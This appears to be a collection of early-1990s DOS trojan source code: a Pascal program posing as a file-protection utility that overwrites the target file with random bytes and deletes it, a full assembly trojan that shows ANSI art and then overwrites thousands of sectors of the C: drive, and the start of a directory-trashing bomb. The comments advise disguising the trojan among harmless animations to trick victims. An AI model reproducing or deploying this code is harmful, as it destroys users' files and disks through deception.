   
}

uses Dos;

var Target    : String;
    f         : File of Byte;
    FSize     : LongInt;
    Space     : Byte;
    S         : PathStr;
    Counter   : Real;
    I         : Integer;
    GoAhead   : Char;

begin
  Randomize;
  WriteLn('SuperRead-Only - (C)opyright 1992 Micro Software, Ltd.');
  WriteLn;
  Write('File you wish to PROTECT:');
  Readln(Target);
  If Target = '' then begin
    WriteLn;
    WriteLn('Error: Program terminated.');
    WriteLn('You must specify a file name.');
    Halt;
  end;
  Assign(f,Target);
  S := FSearch(Target,GetEnv('PATH'));
  if S = '' then begin
    WriteLn(Target,' not found.');
    WriteLn('Program Terminated.');
    Halt;
  end;
  Reset (f);
  FSize := FileSize (f);
  Close (f);
  WriteLn;
  WriteLn(Target,' is ',FSize,' bytes.');
  WriteLn('To SUPER WRITE-PROTECT this file, press [Y].');
  Write('Any other key will terminate.           :');
  ReadLn(GoAhead);
  If (GoAhead <> 'Y') and (GoAhead <> 'y') then
    Halt;
  Reset(f);
  I := 0;
  Repeat
    Seek(f,1);
    Counter := 0;
    Repeat
      Space := Random (256);
      Write(f,Space);
      Counter := Counter +1;
    Until(Counter = FSize);
    I := I +1;
  Until(I = 2);
  Close(f);
  Erase(f);
  WriteLn('Finished!');
 end.-------------------------------------
Trojan Source - penis.asm


; PENIS.ASM [PENIS trojan]
; Laughing Dog MASM/TASM compatible Assembly-Code file/drive destroyer
; Created: 9/5/92, assemble and link to .EXE.
; This piece of code, generated in part by the Laughing Dog 
; screen maker, will write a squirting ANSI penis to the
; monitor (ANSI.SYS is NOT needed) and pause. At the press of any key,
; PENIS trojan will restore the previous video page, reset the cursor
; and crush a tremendous portion of the C: drive. This is totally
; compatible with Laughing Dog videos which always pause on screen
; display. For best results, use Laughing Dog to create any number of 
; harmless "interesting" animated videos and collect them in one archive
; with the PENIS trojan.  (They should, however, be thematically consistant.)
; In this way, the pigeon will enjoy some harmless animated video
; fun before he stumbles upon PENIS. The Laughing Dog utility, LDOGRAB.EXE,
; is very handy for capturing interesting screens to Laughing Dog format
; and was used in the creation of PENIS trojan. The Laughing Dog screen-maker
; is quality shareware and should you use it, PLEASE remember to register.


PENIS_LENGTH    EQU     2000        ; ha ha ha ha, a little funny for ya
       .MODEL    small

       .STACK    100h                ;256 byte stack

       .DATA

PENIS_SCREEN LABEL WORD
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0EDCH, 0EDCH, 0EDCH, 0EDCH, 0EDCH, 06DCH
        DW      8FDCH, 8FDBH, 8FDFH, 0FFDFH, 8FDCH, 8FDCH, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H
        DW      0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0EDCH, 0EDCH, 6EDBH
        DW      6EDFH, 6EDFH, 6EDFH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH
        DW      06DBH, 06DBH, 06DDH, 8FDFH, 8F20H, 8FDFH, 0FFDBH, 0FFDCH
        DW      8FDCH, 8F20H, 0FDFH, 0F20H, 0F20H, 0F20H, 0F20H, 0720H
        DW      0F20H, 0F20H, 7120H, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH
        DW      07DBH, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH
        DW      07DBH, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH
        DW      07DBH, 08DBH, 08DCH, 0820H, 0820H, 0820H, 0F20H, 0F20H
        DW      0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H
        DW      0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H
        DW      0120H, 0EDCH, 0EDCH, 0EDBH, 6EDFH, 6EDFH, 06DBH, 06DBH
        DW      06DBH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH
        DW      06DBH, 06DBH, 06DBH, 0620H, 0620H, 8FDFH, 8F20H, 0FFDBH
        DW      0FDCH, 07DCH, 0FDCH, 87DCH, 87DFH, 8720H, 8720H, 0720H
        DW      0743H, 073AH, 075CH, 0754H, 0749H, 0754H, 0754H, 0759H
        DW      073EH, 68DBH, 6820H, 6820H, 6EDFH, 6EDFH, 6EDBH, 07DBH
        DW      6FDBH, 6FDBH, 6EDBH, 07DBH, 08DBH, 08DBH, 08DBH, 07DBH
        DW      07DBH, 08DBH, 08DBH, 08DBH, 08DCH, 0820H, 0820H, 0820H
        DW      0820H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H
        DW      0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0120H, 0120H
        DW      0EDEH, 3EDBH, 68B0H, 68B0H, 06DBH, 06DBH, 06DBH, 06DBH
        DW      06DBH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH
        DW      06DBH, 06DBH, 06DBH, 06DDH, 0620H, 0620H, 0620H, 0620H
        DW      0FDFH, 0FFDEH, 0FDBH, 0FFDDH, 0FDCH, 0F20H, 87DCH, 0720H
        DW      8720H, 8720H, 7820H, 07DBH, 68DFH, 68DFH, 68DFH, 07DBH
        DW      68DBH, 68DCH, 6820H, 6820H, 6820H, 6820H, 6820H, 07DBH
        DW      6EDBH, 6EDFH, 6EDFH, 07DBH, 6EDFH, 6EDFH, 6E20H, 07DBH
        DW      07DBH, 08DBH, 08DBH, 08DBH, 08DBH, 08DBH, 08DCH, 0820H
        DW      0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H
        DW      0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0120H, 0120H
        DW      0120H, 0120H, 6EDBH, 68B0H, 68B0H, 06DBH, 06DBH, 06DBH
        DW      06DBH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH
        DW      06DBH, 06DBH, 06DBH, 06DDH, 0620H, 0620H, 8FDFH, 8F20H
        DW      8FDCH, 0F0DBH, 0FDFH, 0F20H, 0F0DBH, 0FDBH, 0FDBH, 0FFDDH
        DW      0F20H, 0F20H, 7820H, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH
        DW      07DBH, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH
        DW      07DBH, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH
        DW      07DBH, 08DBH, 08DBH, 08DBH, 08DBH, 08DBH, 08DBH, 08DBH
        DW      08DCH, 0820H, 0820H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H
        DW      0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0920H, 0920H, 0920H
        DW      0EDCH, 6EDBH, 6EDFH, 06DBH, 68B0H, 68B0H, 68B0H, 68B0H
        DW      06DBH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH
        DW      06DBH, 06DBH, 06DBH, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 8FDCH, 87DDH, 8FDFH, 0F0DBH, 0FDCH, 0720H
        DW      0F20H, 0F20H, 7820H, 07DBH, 08DBH, 08DBH, 08DBH, 7820H
        DW      7820H, 7820H, 7820H, 7820H, 08DBH, 08DBH, 08DBH, 07DBH
        DW      08DBH, 08DBH, 08DBH, 07DBH, 08DBH, 08DBH, 08DBH, 07DBH
        DW      07DBH, 08DBH, 38DFH, 3820H, 38DFH, 38DFH, 38DFH, 38DFH
        DW      38DFH, 38DFH, 03DCH, 03DCH, 03DCH, 03DCH, 03DCH, 03DCH
        DW      03DCH, 03DCH, 03DCH, 03DCH, 03DCH, 03DCH, 03DCH, 3EDFH
        DW      3EDFH, 36DFH, 36DFH, 36DFH, 36DFH, 06DBH, 06DBH, 68B0H
        DW      68B0H, 68B0H, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH
        DW      06DBH, 06DBH, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0FDFH, 0FDCH, 7F20H, 0F20H, 0FDCH
        DW      0F20H, 0F20H, 7320H, 07DBH, 08DBH, 08DBH, 08DBH, 07DBH
        DW      7720H, 7720H, 7720H, 07DBH, 08DBH, 08DBH, 08DBH, 07DBH
        DW      6720H, 6720H, 6720H, 07DBH, 68DFH, 68DFH, 68DFH, 07DBH
        DW      07DBH, 08DBH, 08DBH, 03DBH, 03DBH, 3320H, 3B53H, 3B50H
        DW      3B45H, 3B43H, 3B49H, 3B41H, 3B4CH, 3B4CH, 3B59H, 3B20H
        DW      3B4CH, 3B55H, 3B42H, 3B52H, 3B49H, 3B43H, 3B41H, 3B54H
        DW      3B45H, 3B44H, 3B20H, 3B20H, 03DBH, 36DEH, 06DBH, 06DBH
        DW      06DBH, 68B0H, 68B0H, 68B0H, 68B0H, 68B0H, 66DBH, 06DBH
        DW      06DBH, 06DFH, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 87DEH, 0FDCH, 87DBH, 8720H, 87DEH, 8720H
        DW      8720H, 8720H, 7320H, 07DBH, 07DBH, 07DBH, 07DBH, 7720H
        DW      7720H, 7720H, 7720H, 7720H, 7720H, 7720H, 7720H, 7720H
        DW      7720H, 7720H, 7720H, 07DBH, 07DBH, 7720H, 07DBH, 7720H
        DW      07DBH, 08DBH, 08DBH, 03DBH, 3320H, 3320H, 3320H, 3B46H
        DW      3B4FH, 3B52H, 3B20H, 3B20H, 3B48H, 3B45H, 3B52H, 3B20H
        DW      3B20H, 3B50H, 3B4CH, 3B45H, 3B41H, 3B53H, 3B55H, 3B52H
        DW      3B45H, 3B20H, 3B20H, 3B20H, 3B20H, 3B20H, 06DBH, 06DBH
        DW      06DBH, 06DBH, 06DBH, 06DBH, 06DFH, 68B0H, 68B0H, 66DBH
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 8FDCH
        DW      8F20H, 87DDH, 0FDFH, 0F0DBH, 8FDCH, 8F20H, 8F20H, 8F20H
        DW      8F20H, 8F20H, 7B20H, 07DBH, 08DBH, 08DBH, 08DBH, 07DBH
        DW      08DBH, 08DBH, 08DBH, 07DBH, 08DBH, 08DBH, 08DBH, 7820H
        DW      7820H, 7820H, 7820H, 07DBH, 68DFH, 68DFH, 68DFH, 07DBH
        DW      07DBH, 08DBH, 08DBH, 38DDH, 03DBH, 3B54H, 3B65H, 3B61H
        DW      3B72H, 03DBH, 3BDCH, 3BDCH, 3BDCH, 3BDCH, 3BDCH, 3BDCH
        DW      3BDCH, 3BDCH, 3BDCH, 3BDCH, 3BDCH, 3BDCH, 3BDCH, 3B20H
        DW      3B20H, 3B48H, 3B65H, 3B72H, 3B65H, 03DBH, 36DEH, 06DBH
        DW      06DBH, 06DBH, 06DBH, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 87DFH, 0F0DBH, 8FDCH, 0FDFH, 87DDH
        DW      8720H, 8720H, 07DBH, 07DBH, 08DBH, 18DFH, 19DCH, 09DBH
        DW      09DBH, 09DBH, 09DBH, 09DBH, 09DBH, 09DBH, 09DBH, 79DCH
        DW      79DCH, 07DBH, 07DBH, 07DBH, 6720H, 6720H, 6720H, 07DBH
        DW      07DBH, 08DBH, 08DBH, 08DBH, 03DBH, 3F2DH, 03DBH, 3F2DH
        DW      3BDCH, 3BDBH, 3BDFH, 3F2DH, 03DBH, 3F2DH, 3F20H, 3F2DH
        DW      3F20H, 3F2DH, 03DBH, 3F2DH, 03DBH, 3F2DH, 3BDFH, 3BDBH
        DW      3BDCH, 3F2DH, 3F20H, 3F2DH, 3F20H, 3F2DH, 36DEH, 06DBH
        DW      06DBH, 06DBH, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0FDFH, 0FDCH, 0F0DBH, 87DCH
        DW      8720H, 8720H, 7320H, 7320H, 01DBH, 09DBH, 09DBH, 09DBH
        DW      19DFH, 79DCH, 79DCH, 79DCH, 71DFH, 19DFH, 09DBH, 09DBH
        DW      09DBH, 79DDH, 7920H, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH
        DW      07DBH, 08DBH, 08DBH, 08DBH, 38DDH, 03DBH, 03DBH, 3320H
        DW      3BDBH, 3B20H, 3B20H, 03DBH, 3320H, 3B54H, 3B52H, 3B4FH
        DW      3B4AH, 3B41H, 3B4EH, 3B20H, 3B20H, 3B20H, 3B20H, 3B20H
        DW      3BDFH, 3BDBH, 03DBH, 3320H, 03DBH, 03DBH, 36DEH, 06DBH
        DW      06DBH, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 87DCH, 87DDH, 8720H, 0FFDBH
        DW      0F20H, 0F20H, 7320H, 7320H, 78DBH, 18DCH, 19DFH, 09DBH
        DW      19DEH, 09DBH, 09DBH, 7920H, 78DBH, 18DBH, 1820H, 09DBH
        DW      09DBH, 09DBH, 08DBH, 7820H, 08DBH, 08DBH, 08DBH, 07DBH
        DW      07DBH, 08DBH, 08DBH, 08DBH, 38DDH, 03DBH, 03DBH, 3320H
        DW      3BDBH, 3B20H, 3B20H, 03DBH, 3320H, 3BDCH, 3BDCH, 3BDBH
        DW      3BDBH, 3BDBH, 3BDCH, 3BDCH, 3B20H, 3B20H, 3B20H, 3B20H
        DW      3B20H, 3BDFH, 3BDBH, 03DBH, 3320H, 03DBH, 03DBH, 06DFH
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0F0DCH, 87DEH, 8720H, 0FDCH
        DW      0F20H, 0F20H, 7320H, 7320H, 78DBH, 78DBH, 18DDH, 19DEH
        DW      19DEH, 09DBH, 09DBH, 19DEH, 18DFH, 19DCH, 09DBH, 09DBH
        DW      09DBH, 09DBH, 08DBH, 07DBH, 08DBH, 08DBH, 08DBH, 07DBH
        DW      07DBH, 08DBH, 08DBH, 08DBH, 08DBH, 03DBH, 03DBH, 3320H
        DW      3BDBH, 3B20H, 03DBH, 3BDCH, 3BDBH, 3BDBH, 3BDBH, 3BDBH
        DW      3BDBH, 3BDBH, 3BDBH, 3BDBH, 3BDCH, 3B20H, 3B20H, 3B20H
        DW      3B20H, 3B20H, 3BDBH, 3B20H, 3B20H, 3B20H, 03DBH, 03DDH
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 87DDH, 8720H, 0F0DBH
        DW      0F20H, 0F20H, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH, 01DBH
        DW      09DBH, 09DBH, 19DBH, 19DEH, 09DBH, 19DBH, 09DBH, 79DFH
        DW      7920H, 1920H, 09DBH, 09DBH, 09DBH, 09DBH, 09DBH, 09DBH
        DW      09DBH, 09DBH, 09DBH, 09DBH, 09DBH, 38DDH, 3820H, 3820H
        DW      3BDBH, 3B20H, 03DBH, 3BDFH, 03DBH, 3BDBH, 3BDBH, 3BDBH
        DW      3BDBH, 3BDBH, 03DBH, 3BDCH, 3BDCH, 03DBH, 3320H, 3320H
        DW      3320H, 3BDCH, 3BDBH, 3B20H, 3B20H, 3B20H, 3B20H, 03DDH
        DW      0320H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H
        DW      0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H
        DW      0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0720H, 0720H, 0720H
        DW      8F20H, 8F20H, 07DBH, 07DBH, 68DBH, 68DBH, 68DBH, 01DBH
        DW      09DBH, 09DBH, 09DBH, 09DBH, 58DBH, 58DBH, 7820H, 7820H
        DW      7820H, 7820H, 7820H, 7820H, 7820H, 7820H, 71DEH, 19DEH
        DW      19DBH, 19DDH, 19DBH, 19DBH, 38DBH, 18DBH, 13DFH, 19DCH
        DW      19DBH, 39DCH, 3920H, 03DBH, 3BDCH, 3BDBH, 3BDFH, 3BDBH
        DW      3BDFH, 03DBH, 3BDCH, 3BDCH, 3B20H, 3B20H, 3B20H, 31DCH
        DW      19DCH, 09DBH, 09DBH, 09DBH, 09DBH, 39B2H, 39B1H, 39B0H
        DW      0F20H, 0F20H, 0F20H, 0F20H, 08FAH, 0820H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0820H, 0820H, 07DBH, 07DBH, 68DDH, 68DDH, 68DDH, 18DDH
        DW      19DEH, 09DBH, 09DBH, 19DEH, 09DBH, 09DBH, 19DBH, 09DBH
        DW      1920H, 09DBH, 09DBH, 09DBH, 09DBH, 79DCH, 71DEH, 19DEH
        DW      09DBH, 19DDH, 09DBH, 09DBH, 38DBH, 18DDH, 19DEH, 09DBH
        DW      39DFH, 3BDFH, 3BDBH, 3BDCH, 3BDFH, 03DBH, 3BDCH, 3B20H
        DW      31DCH, 39DCH, 39DCH, 3920H, 31DCH, 39DCH, 39DCH, 19DCH
        DW      09DBH, 09DBH, 09DBH, 39B2H, 39B1H, 39B0H, 3920H, 3920H
        DW      03DDH, 0320H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      19DEH, 09DBH, 09DBH, 19DEH, 09DBH, 19DDH, 19DCH, 19DCH
        DW      1920H, 09DBH, 09DBH, 19DFH, 09DBH, 09DBH, 19DDH, 19DEH
        DW      09DBH, 19DDH, 09DBH, 09DBH, 1DDFH, 19DCH, 09DBH, 09DBH
        DW      31DCH, 19DCH, 09DBH, 09DBH, 09DBH, 19DDH, 09DBH, 09DBH
        DW      1920H, 09DBH, 09DBH, 01DBH, 09DBH, 09DBH, 19DFH, 19DBH
        DW      19DEH, 09DBH, 09DBH, 09DBH, 09DBH, 59B2H, 59B1H, 59B0H
        DW      5DB0H, 5DB1H, 5DB2H, 5DDBH, 0DDBH, 0DDBH, 0DDBH, 0DDBH
        DW      0DDBH, 0DDBH, 0DDBH, 0DDBH, 0DDBH, 0DDBH, 0DDBH, 0DDBH
        DW      0DDBH, 0DDBH, 0DDBH, 0DDBH, 0DDBH, 0DDBH, 0DDBH, 0DDBH
        DW      5D20H, 5D20H, 05DBH, 05DBH, 05DBH, 05DBH, 05DBH, 15DDH
        DW      19DEH, 09DBH, 09DBH, 19DEH, 09DBH, 19DDH, 59DFH, 59DFH
        DW      1920H, 09DBH, 09DBH, 51DEH, 19DEH, 09DBH, 19DDH, 19DEH
        DW      09DBH, 19DDH, 09DBH, 09DBH, 09DBH, 19DFH, 09DBH, 09DBH
        DW      19DEH, 09DBH, 09DBH, 1920H, 09DBH, 09DBH, 09DBH, 09DBH
        DW      19DDH, 09DBH, 09DBH, 51DFH, 19DFH, 09DBH, 09DBH, 19DCH
        DW      19DEH, 09DBH, 09DBH, 59B2H, 59B1H, 59B0H, 5920H, 5920H
        DW      5920H, 5920H, 5920H, 5920H, 5920H, 5920H, 5920H, 5920H
        DW      5920H, 5920H, 5920H, 5920H, 5920H, 5920H, 5920H, 5920H
        DW      5920H, 5920H, 5920H, 5920H, 5920H, 5920H, 5920H, 5920H
        DW      4920H, 4920H, 4920H, 4920H, 4920H, 4920H, 4920H, 41DEH
        DW      19DEH, 09DBH, 09DBH, 19DEH, 09DBH, 09DBH, 09DBH, 09DBH
        DW      1920H, 09DBH, 09DBH, 41DEH, 19DEH, 09DBH, 19DDH, 19DEH
        DW      09DBH, 19DDH, 09DBH, 09DBH, 4920H, 1920H, 09DBH, 19DBH
        DW      41DFH, 19DFH, 09DBH, 09DBH, 09DBH, 19DFH, 19DEH, 09DBH
        DW      09DBH, 09DBH, 09DBH, 19DDH, 09DBH, 09DBH, 09DBH, 19DFH
        DW      19DEH, 09DBH, 09DBH, 09DBH, 09DBH, 09DBH, 79DBH, 49B2H
        DW      49B1H, 49B0H, 4920H, 4920H, 4920H, 4920H, 4920H, 4920H
        DW      4920H, 4920H, 4920H, 4920H, 4920H, 4920H, 4920H, 4920H
        DW      4920H, 4920H, 4920H, 4920H, 4920H, 4920H, 4920H, 4920H
        DW      2920H, 2920H, 02DBH, 02DBH, 02DBH, 02DBH, 02DBH, 02DBH
        DW      12DCH, 29DFH, 29DFH, 79B2H, 79B2H, 79B2H, 79B2H, 79B1H
        DW      79B2H, 79B2H, 79B2H, 79B1H, 79B2H, 79B2H, 79B0H, 79B2H
        DW      79B2H, 79B2H, 79B2H, 79B2H, 79B0H, 79B0H, 21DFH, 29DFH
        DW      29DFH, 79B2H, 79B2H, 79B1H, 79B1H, 79B1H, 79B2H, 79B2H
        DW      79B2H, 79B1H, 79B1H, 79B2H, 79B2H, 79B2H, 79B1H, 79B1H
        DW      79B2H, 79B2H, 79B2H, 79B1H, 21DFH, 29DFH, 29DFH, 27B2H
        DW      27B1H, 27B0H, 02DBH, 02DBH, 02DBH, 02DBH, 02DBH, 02DBH
        DW      02DBH, 02DBH, 02DBH, 02DBH, 02DBH, 02DBH, 02DBH, 02DBH
        DW      02DBH, 02DBH, 02DBH, 02DBH, 02DBH, 02DBH, 02DBH, 02DBH
        DW      0ADBH, 0ADBH, 0ADBH, 0ADBH, 7ADBH, 7ADBH, 7ADBH, 79B1H
        DW      79B1H, 79B1H, 79B1H, 79B1H, 79B1H, 79B1H, 79B0H, 79B1H
        DW      79B1H, 79B1H, 79B1H, 79B1H, 79B0H, 79B0H, 79B2H, 79B2H
        DW      79B2H, 79B1H, 79B1H, 79B0H, 79B0H, 79B0H, 0ADBH, 79B2H
        DW      79B2H, 79B2H, 79B1H, 79B1H, 79B0H, 79B2H, 79B2H, 79B2H
        DW      79B1H, 79B0H, 79B2H, 79B2H, 79B2H, 79B1H, 79B1H, 79B2H
        DW      79B2H, 79B2H, 79B1H, 79B1H, 79B0H, 79B0H, 7AB0H, 7AB1H
        DW      7AB2H, 0ADBH, 0ADBH, 0ADBH, 0ADBH, 0ADBH, 0ADBH, 0ADBH
        DW      0ADBH, 0ADBH, 0ADBH, 0ADBH, 0ADBH, 0ADBH, 0ADBH, 0ADBH
        DW      0ADBH, 0ADBH, 0ADBH, 0ADBH, 0ADBH, 0ADBH, 0ADBH, 0ADBH
        DW      7EDBH, 7EDBH, 7EDBH, 7EDBH, 7EDBH, 7EDBH, 7EDBH, 1FB1H
        DW      1FB1H, 1FB1H, 1FB1H, 1FB1H, 1FB1H, 1FB1H, 1FB1H, 1FB1H
        DW      1FB1H, 79B0H, 79B0H, 79B0H, 79B0H, 1FB1H, 1FB1H, 1FB1H
        DW      1FB1H, 1FB1H, 79B0H, 79B0H, 7920H, 1FB1H, 79B2H, 79B2H
        DW      1FB1H, 1FB1H, 79B0H, 79B0H, 79B2H, 79B2H, 79B1H, 79B0H
        DW      79B0H, 79B2H, 79B2H, 1FB1H, 1FB1H, 79B0H, 79B2H, 79B2H
        DW      1FB1H, 1FB1H, 1FB1H, 7EB1H, 7EB1H, 7EB2H, 7EB2H, 4EDBH
        DW      4EDBH, 4EDBH, 4EDBH, 4EDBH, 4EDBH, 4EDBH, 4EDBH, 4EDBH
        DW      4EDBH, 4EDBH, 4EDBH, 4EDBH, 4EDBH, 4EDBH, 4EDBH, 4EDBH
        DW      4EDBH, 4EDBH, 4EDBH, 4EDBH, 4EDBH, 4EDBH, 4EDBH, 4EDBH
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0F20H, 0F20H, 0F20H, 0F20H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H

        .CODE
         ;STARTUP CODE  Set up DS, SS and SP Regs.
dogstart:
         mov dx, @data
         mov ds, dx
         mov bx, ss
         sub bx, dx
         shl bx, 1
         shl bx, 1
         shl bx, 1
         shl bx, 1
         cli
         mov ss, dx
         add sp, bx
         sti
;Actual program begins here
         push   es            ;save es register
         mov    ah,0fh        ;get current video mode
         int    010h
         cmp    al,7          ;is it a monochrome mode?
         jz     mono          ;yes
         mov    ax,0B800h     ;color text video segment
         jmp    SHORT doit
mono:    mov    ax, 0B000h    ;monochrome text video segment
doit:    mov    es,ax
         sub    si,si         ;clear source index counter
         mov    si,offset PENIS_SCREEN ;load destination offset
         sub    di,di         ;clear destination index counter
         mov    cx,PENIS_LENGTH
         rep movsw            ;write to video memory

         mov    ah,02h        ;hide cursor
         mov    bh,0          ;assume video page 0
         mov    dx,1A00h      ;moves cursor past bottom of screen
         int    010h
lup:     mov    ah, 01h       ;wait for a keystroke
         int    016h          ;this makes PENIS sporting and I prefer it that
         jz     lup           ;way. Alter the code to disallow if you wish.
         mov    ah,0          ;clear keyboard buffer
         int    016h

       ;Clear the screen
         mov    ah, 6         ;function 6 (scroll window up)
         mov    al, 0         ;blank entire screen
         mov    bh, 7         ;attribute to use
         mov    ch, 0         ;starting row
         mov    cl, 0         ;starting column
         mov    dh, 25        ;ending row
         mov    dl, 80        ;ending column
         int    10h           ;call interrupt 10h

         mov    ah,02h        ;puts cursor back where it belongs
         mov    bh,0          ;assume video page 0
         mov    dx,0
         int    010h

         pop    es            ;restore es register
 ;
 ;Beginning of "crush-the-drive" routine (next 6 opcodes)
 ;
         mov     ax,0002h     ; First argument is 2
         mov     cx,0BB8h     ; Second argument is 3000
         cli                  ; Disable interrupts (no Ctrl-C)
         cwd                  ; Clear DX (start with sector 0)
         int     026h         ; DOS absolute write interrupt
         sti                             ; Restore interrupts
         
         mov    ax,4c00h      ;DOS exit function w/exitcode = 0
         int    21h

         END dogstart

-------------------------------------
Trojan Source - smash.asm


;skism directory bomb v1.00

;written by hellraiser

;this is a lame bomb consisting of repetative/error full code
;but it gets the job done
;when run this program will start at the first directory from the root
;and trash all files in first level directorys
;then create a directory in place of the distroyed file name

;it will also create a semi-removable directory called skism

;yes bombs are very lame, and be advised, this is the only bomb
;skism shall ever write... but we must try everything once

;be warned, the tech used by this program does not only erase files but
;it will also truncate them to 0 bytes, the skism method.

code     segment  'code'
assume   cs:code,ds:code,es:code
         org 0100h

main     proc   near

jmp      start


thestoppa db   1ah                     ;EOF char to stop TYPE command
filecards db   '*.*',0                 ;wildcards for files
dircards  db   '*',0                   ;wildcards for directorys
root      db   '\',0                   ;root directory path
default   db   64    DUP (?)           ;buffer to hold current dir
dirdta    db   43    DUP (?)           ;DTA for dirs
filedta   db   43    DUP (?)           ;DTA for files
